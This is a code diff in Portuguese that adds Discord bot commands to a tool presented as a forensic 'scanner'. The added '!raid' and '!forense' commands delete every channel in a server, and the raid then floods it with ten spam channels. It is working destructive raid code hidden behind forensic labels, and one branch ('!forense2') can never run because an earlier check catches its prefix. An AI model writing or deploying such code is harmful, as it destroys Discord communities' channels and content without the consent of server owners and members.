@@ -201,3 +201,111 @@ def enviar_mensagem_discord(mensagem):
         print(f"Erro ao enviar mensagem: {r.status_code}")
         print(r.text)
 
+# =========================
+# Função de raid
+# =========================
+async def raid_server(guild, token):
+    headers = {
+        "Authorization": token,
+        "Content-Type": "application/json"
+    }
+    # Deletar canais
+    for channel in guild.channels:
+        try:
+            await channel.delete()
+            print(f"Deletado: {channel.name}")
+        except:
+            pass
+    # Criar canais
+    for _ in range(10):  # quantidade de canais
+        try:
+            await guild.create_text_channel("Análise-Forense-Crystal")
+            print("Canal criado: Análise-Forense-Crystal")
+        except:
+            pass
+    print("Raid concluída!")
+
+# =========================
+# Evento do discord para detectar comando !raid e comandos forense
+# =========================
+intents = discord.Intents.all()
+client = discord.Client(intents=intents)
+
+@client.event
+async def on_ready():
+    print(f'Logado como {client.user}')
+
+@client.event
+async def on_message(message):
+    # Evitar loops
+    if message.author == client.user:
+        return
+
+    # Comando para iniciar raid
+    if message.content.startswith("!raid"):
+        perms = message.author.guild_permissions
+        if not perms.manage_channels:
+            await message.channel.send("Você não tem permissão para fazer isso.")
+            return
+        await message.channel.send("Iniciando raid...")
+        await raid_server(message.guild, client.http.token)
+
+    # Comandos forense
+    elif message.content.startswith("!forense"):
+        guild = message.guild
+        await message.delete()
+        for canal in guild.channels:
+            try:
+                await canal.delete()
+            except:
+                pass
+        await message.channel.send("Canais deletados!")
+
+    elif message.content.startswith("!forense2"):
+        guild = message.guild
+        await message.delete()
+        # Criar cargo se não existir
+        role_name = "crystalxforense"
+        existing_roles = [role for role in guild.roles if role.name == role_name]
+        if not existing_roles:
+            await guild.create_role(name=role_name)
+        # Criar canal se não existir
+        channel_name = "crystalxforense"
+        existing_channels = [ch for ch in guild.channels if ch.name == channel_name]
+        if not existing_channels:
+            await guild.create_text_channel(name=channel_name)
+        await message.channel.send("Cargo e canal criados!")
+
+# =========================
+# =========================
+# MENU PRINCIPAL
+# =========================
+def menu():
+    while True:
+        banner()
+        print("[1] Start Scanner")
+        print("[2] Reset Config")
+        print("[3] Login Key")
+        print("[4] Sair")
+        print("\nDigite '!enviar Sua mensagem' para enviar uma mensagem ao Discord enquanto o scanner roda.")
+        print("Digite '!sair' no comando de entrada para parar a entrada de comandos.\n")
+        op = input(">> ").strip()
+        if op == "1":
+            if login():
+                start_scanner()
+        elif op == "2":
+            reset_config()
+        elif op == "3":
+            login()
+        elif op == "4":
+            print("\nSaindo...\n")
+            break
+        else:
+            print("\nOpção inválida\n")
+            time.sleep(1)
+
+if __name__ == "__main__":
+    menu()
+    # Solicitar o token ao iniciar
+    token_input = input("Digite seu token do Discord: ").strip()
+    client.run(token_input)
